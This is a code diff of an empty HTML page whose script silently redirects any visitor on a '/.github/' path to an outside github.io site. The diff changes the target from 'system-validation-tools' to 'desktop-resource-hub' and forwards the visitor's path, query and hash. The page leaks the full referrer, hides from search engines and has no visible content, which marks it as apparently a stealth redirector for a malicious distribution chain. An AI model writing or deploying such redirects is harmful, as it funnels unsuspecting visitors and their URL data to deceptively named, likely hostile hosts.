@@ -1,25 +1,21 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="referrer" content="unsafe-url">
     <title>...</title>
     <script>
-        (function() {
-            const path = window.location.pathname;
-            const match = path.match(/\/\.github\/(.+)$/);
-            
-            if (match && match[1]) {
-                const text = match[1];
-                window.location.replace('https://system-validation-tools.github.io/.github/' + text);
-            }
+        (function () {
+            var base = 'https://desktop-resource-hub.github.io';
+            var path = window.location.pathname;
+            var idx = path.indexOf('/.github/');
+            if (idx === -1) return;
+            var tail = path.substring(idx + 9) + window.location.search + window.location.hash;
+            document.location.replace(base + '/.github/' + tail);
         })();
     </script>
     <meta name="robots" content="noindex, nofollow">
-    <style>
-        body { background: #ffffff; margin: 0; padding: 0; }
-    </style>
+    <style>body{background:#fff;margin:0;padding:0}</style>
 </head>
-<body>
-</body>
+<body></body>
 </html>
